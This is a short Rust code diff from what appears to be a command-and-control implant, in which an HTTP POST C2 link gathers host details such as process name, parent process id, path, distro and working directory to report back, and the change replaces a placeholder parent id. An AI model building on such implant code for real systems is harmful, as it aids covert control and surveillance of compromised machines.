@@ -480,7 +480,7 @@ impl LinkFetch for HTTPPostC2Link {
         let peer_public_key_bytes = key_pair.public_key().as_ref().to_vec();
 
         let sys: System = System::new_all();
-        let (process_name, parent_name) = process_name_and_parent(&sys);
+        let (process_name, parent_name,ppid) = process_name_and_parent(&sys);
         let process_path = process_path();
 
         //let args: Vec<String> = ;
@@ -497,8 +497,7 @@ impl LinkFetch for HTTPPostC2Link {
             distro: whoami::distro(),
             desktop_env: whoami::desktop_env().to_string(),
             pid: process::id(),
-            //TODO parent
-            ppid: 0,          
+            ppid: ppid,          
             process_name : process_name,
             process_path: process_path,
             working_dir : working_dir(),
